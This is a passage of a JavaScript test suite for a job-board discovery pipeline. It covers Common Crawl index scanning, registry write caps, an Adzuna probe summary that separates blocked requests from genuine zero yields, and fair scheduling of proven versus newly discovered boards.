  assert.equal(out.registered, 2, 'both upserted (merge-duplicates refreshes the known one)');
  assert.equal(out.new_boards, 1, 'but only one is genuinely new');
  assert.equal(out.reason, 'ok');
  assert.deepEqual(registered.sort(), ['greenhouse|airbnb', 'greenhouse|stripe']);
});

test('discoverFromCommonCrawl distinguishes all_known from no_tenants and from not_registered', async () => {
  const shards = { 'cdx-00199.gz@4096': shardLine('https://boards.greenhouse.io/airbnb/jobs/1') };
  const known = await discoverFromCommonCrawl({
    fetchImpl: ccFetch({ idxText: padded(ONE_GH_BLOCK), shards }), patterns: ['boards.greenhouse.io/*'],
    supabaseUrl: 'https://db.test', serviceKey: 'k',
    existingKeysImpl: async () => new Set(['greenhouse|airbnb']),
    registerImpl: async () => true,
  });
  assert.equal(known.reason, 'all_known');
  assert.equal(known.new_boards, 0);

  const empty = await discoverFromCommonCrawl({
    fetchImpl: ccFetch({ idxText: padded(ONE_GH_BLOCK) }), patterns: ['boards.greenhouse.io/*'],
    supabaseUrl: 'https://db.test', serviceKey: 'k',
    existingKeysImpl: async () => new Set(), registerImpl: async () => true,
  });
  assert.equal(empty.reason, 'no_tenants');
  assert.equal(empty.discovered, 0);

  // Tenants found but no registry configured: claiming all_known would assert a comparison against a
  // database this run never opened — the same unearned claim as labelling a refusal no_tenants.
  const noDb = await discoverFromCommonCrawl({
    fetchImpl: ccFetch({ idxText: padded(ONE_GH_BLOCK), shards }), patterns: ['boards.greenhouse.io/*'],
  });
  assert.equal(noDb.reason, 'not_registered');
  assert.equal(noDb.discovered, 1);
  assert.equal(noDb.registered, 0);
});

test('maxRegister bounds how many boards one run writes', async () => {
  const body = Array.from({ length: 12 }, (_, i) => shardLine(`https://boards.greenhouse.io/co${i}/jobs/1`)).join('\n');
  const f = ccFetch({ idxText: padded(ONE_GH_BLOCK), shards: { 'cdx-00199.gz@4096': body } });
  let writes = 0;
  const out = await discoverFromCommonCrawl({
    fetchImpl: f, patterns: ['boards.greenhouse.io/*'], maxRegister: 5,
    supabaseUrl: 'https://db.test', serviceKey: 'k',
    existingKeysImpl: async () => new Set(), registerImpl: async () => { writes++; return true; },
  });
  assert.equal(out.discovered, 12, 'discovery is not capped by maxRegister');
  assert.equal(writes, 5, 'but writes are');
  assert.equal(out.registered, 5);
});

test('the index is never fetched unranged — a 99MB download would blow the function budget', async () => {
  const f = ccFetch({ idxText: padded(ONE_GH_BLOCK) });
  await discoverFromCommonCrawl({ fetchImpl: f, patterns: ['boards.greenhouse.io/*'] });
  assert.ok(f.calls.length > 0);
  for (const c of f.calls) {
    if (c.url.includes('collinfo.json')) continue;
    assert.match(c.range || '', /^bytes=\d+-\d+$/, `unranged request to ${c.url}`);
  }
});

test('discover-sources pageFor advances once per cron interval and wraps at 40', () => {
  const iv = 12 * 60 * 60 * 1000;
  const base = 900_000 * iv;
  assert.equal(pageFor(base + iv, iv), (pageFor(base, iv) + 1) % 40, 'consecutive runs must not rescan a block');
  assert.equal(pageFor(base + 40 * iv, iv), pageFor(base, iv), 'wraps after 40');
  assert.equal(pageFor(base + 60_000, iv), pageFor(base, iv), 'stable within one interval');
});

// ── The silent-zero guard on the Adzuna probe ──────────────────────────────────
// Both the owner (from a Mac) and Claude (in api/discover-sources.js) independently wrote this probe
// so that a non-2xx counted as a successful resolution. Adzuna 403s bots, so 50 refusals read as
// "50 resolutions to adzuna.com, 0% ATS" — a decisive-looking number that would have killed the
// designated 50k path on nothing. Naming the class did not stop either of us writing it, so it is
// pinned here instead of trusted to care.

test('a blocked probe reports blocked_yield_unknown, never a 0% yield', () => {
  const blocked = Array.from({ length: 50 }, () => ({ shape: 'details', resolved: false, blocked: true, status: 403 }));
  const out = summarizeAdzunaProbe(blocked);

  assert.equal(out.verdict, 'blocked_yield_unknown');
  assert.equal(out.resolved, 0);
  assert.equal(out.blocked, 50);
  // THE line that matters: unknown must be null, never a persuasive zero.
  assert.equal(out.ats_ingestable_rate, null, '0 refusals must not read as 0% yield');
  assert.equal(out.ats_ingestable_hits, 0);
  assert.deepEqual(out.http_status_histogram, { 403: 50 });
  assert.deepEqual(out.destination_hosts, {}, 'a refused request has no destination');
});

test('a genuine zero yield is reported differently from a block', () => {
  const resolvedNoAts = Array.from({ length: 10 }, () => ({
    shape: 'details', resolved: true, blocked: false, status: 200, host: 'adzuna.com', body_providers: [],
  }));
  const out = summarizeAdzunaProbe(resolvedNoAts);
  assert.equal(out.verdict, 'resolved_but_no_ats_in_destination_or_body');
  assert.equal(out.ats_ingestable_rate, 0, 'a real zero IS zero — only unknown is null');
  assert.deepEqual(out.destination_hosts, { 'adzuna.com': 10 });
});

test('the ATS rate is computed over resolved responses only, and body hits count', () => {
  const mixed = [
    { shape: 'details', resolved: true, blocked: false, status: 200, host: 'boards.greenhouse.io', final_provider: 'greenhouse' },
    { shape: 'details', resolved: true, blocked: false, status: 200, host: 'adzuna.com', body_providers: ['lever'] },
    { shape: 'land_ad', resolved: true, blocked: false, status: 200, host: 'adzuna.com', body_providers: [] },
    { shape: 'land_ad', resolved: false, blocked: true, status: 403 },
    { shape: 'land_ad', resolved: false, blocked: false, status: null, error: 'TimeoutError' },
  ];
  const out = summarizeAdzunaProbe(mixed);
  assert.equal(out.verdict, 'ats_recoverable');
  assert.equal(out.resolved, 3);
  assert.equal(out.blocked, 1);
  assert.equal(out.threw, 1);
  // 2 hits over 3 RESOLVED — the two unresolved must not dilute the denominator.
  assert.equal(out.ats_ingestable_hits, 2);
  assert.equal(out.ats_ingestable_rate, 0.667);
  assert.deepEqual(out.providers, { greenhouse: 1, lever: 1 });
  assert.deepEqual(out.http_status_histogram, { 200: 3, 403: 1, threw: 1 });
  // Both stub shapes tracked separately — the corpus is 11,734 /details/ + 8,598 /land/ad/.
  assert.equal(out.by_shape.details.sampled, 2);
  assert.equal(out.by_shape.land_ad.sampled, 3);
  assert.equal(out.by_shape.land_ad.blocked, 1);
});

// ── dueSources: discovery succeeding must not starve the proven boards ─────────
// The single `last_successful_sync.asc.nullsfirst` ordering is safe only while the registry is small
// and hand-curated. Once discovery registers at scale, every new board sorts ahead of every proven
// one — and because recordSourceSync does NOT set last_successful_sync on failure, a DEAD tenant
// stays null and reclaims the front of the queue for all 8 runs the breaker needs to disable it.
// Proven boards would stop refreshing and their listings would age out of the 7-day stale window.

function registryFetch(rows) {
  const calls = [];
  return Object.assign(async (url) => {
    calls.push(url);
    const limit = Number(/[?&]limit=(\d+)/.exec(url)?.[1] ?? 1000);
    const wantNull = url.includes('last_successful_sync=is.null');
    const pool = rows.filter(r => (r.last_successful_sync == null) === wantNull);
    const sorted = wantNull
      ? [...pool].sort((a, b) => (a.consecutive_failures || 0) - (b.consecutive_failures || 0))
      : [...pool].sort((a, b) => String(a.last_successful_sync).localeCompare(String(b.last_successful_sync)));
    return { ok: true, status: 200, json: async () => sorted.slice(0, limit) };
  }, { calls });
}

const board = (id, sync, fails = 0) => ({ id, company_name: id, provider: 'greenhouse', tenant: id, consecutive_failures: fails, last_successful_sync: sync });

test('dueSources reserves slots for proven boards when new boards flood the registry', async () => {
  // 500 never-synced discovered boards against 19 proven ones — the post-discovery shape.
  const flood = Array.from({ length: 500 }, (_, i) => board(`new-${i}`, null));
  const proven = Array.from({ length: 19 }, (_, i) => board(`proven-${i}`, `2026-08-1${i % 10}T00:00:00Z`));
  const out = await dueSources('https://db.test', 'k', 24, { fetchImpl: registryFetch([...flood, ...proven]) });

  assert.equal(out.length, 24);
  const provenTaken = out.filter(r => r.id.startsWith('proven-')).length;
  assert.ok(provenTaken >= 8, `proven boards starved: only ${provenTaken} of 24 slots`);
  assert.ok(out.some(r => r.id.startsWith('new-')), 'new boards must still drain');
  assert.equal(new Set(out.map(r => r.id)).size, 24, 'no duplicates across pools');
});

test('dueSources deprioritises repeatedly-failing tenants within the fresh pool', async () => {
  // A dead tenant that has already burned 5 runs must not keep beating brand-new boards to the front.
  const rows = [
    ...Array.from({ length: 10 }, (_, i) => board(`dead-${i}`, null, 5)),
    ...Array.from({ length: 10 }, (_, i) => board(`brandnew-${i}`, null, 0)),
  ];
  const out = await dueSources('https://db.test', 'k', 12, { fetchImpl: registryFetch(rows) });
  const freshTaken = out.filter(r => r.id.startsWith('brandnew-') || r.id.startsWith('dead-'));
  assert.ok(freshTaken.length > 0);
  assert.ok(
    freshTaken.filter(r => r.id.startsWith('brandnew-')).length >= freshTaken.filter(r => r.id.startsWith('dead-')).length,
    'failing tenants should not dominate the fresh slots',
  );
});

test('dueSources backfills from the other pool and behaves as before on a small registry', async () => {
  // The 27-board registry as it stands today: 19 proven, no discovered boards at all.
  const proven = Array.from({ length: 19 }, (_, i) => board(`p-${i}`, `2026-08-0${(i % 9) + 1}T00:00:00Z`));
  const out = await dueSources('https://db.test', 'k', 24, { fetchImpl: registryFetch(proven) });
  assert.equal(out.length, 19, 'every proven board still returned when there is nothing else to run');

  // And the mirror: only new boards, no proven ones — all slots go to the fresh pool.
  const fresh = Array.from({ length: 40 }, (_, i) => board(`n-${i}`, null));
  const out2 = await dueSources('https://db.test', 'k', 24, { fetchImpl: registryFetch(fresh) });
  assert.equal(out2.length, 24);
  assert.ok(out2.every(r => r.id.startsWith('n-')));
});

// ── a SUCCESSFUL headline must still disclose partial failure ──────────────────
// reason='ok' means "registered at least one new board". It does not mean "the sweep was complete".
// If three of seven patterns 503'd and the survivors happened to yield a new tenant, the run is both
// a success and partial — and the errors previously lived only in pattern_errors, where a reader who
// trusted `reason` would never look. Same failure-hidden-behind-a-clean-summary shape the taxonomy
// exists to prevent, one level up.
test('read errors are disclosed in detail even when the sweep succeeds', async () => {
  const base = ccFetch({
    idxText: padded([
      { key: 'co,lever,jobs)/', shard: 'cdx-00300.gz', offset: 8192, length: 500 },
      { key: 'io,greenhouse,boards)/', shard: 'cdx-00199.gz', offset: 4096, length: 500 },
    ]),
    shards: { 'cdx-00199.gz@4096': shardLine('https://boards.greenhouse.io/acme/jobs/1') },
  });
  // Greenhouse's block serves fine; Lever's shard is refused.
  const f = async (url, opts) => (
    url.includes('cdx-00300.gz')
      ? { ok: false, status: 503, arrayBuffer: async () => new ArrayBuffer(0) }
      : base(url, opts)
  );

  const out = await discoverFromCommonCrawl({
    fetchImpl: f,
    patterns: ['boards.greenhouse.io/*', 'jobs.lever.co/*'],
    supabaseUrl: 'https://db.test', serviceKey: 'k',
    existingKeysImpl: async () => new Set(),
    registerImpl: async () => true,
  });

  assert.equal(out.reason, 'ok', 'a new board WAS registered, so the headline is genuinely ok');
  assert.equal(out.new_boards, 1);
  assert.ok(out.pattern_errors.length >= 1, 'the refused shard was recorded');
  assert.match(out.detail, /read error/, `partial failure hidden behind a clean reason: detail=${out.detail}`);
  assert.match(out.detail, /http_503/);
});
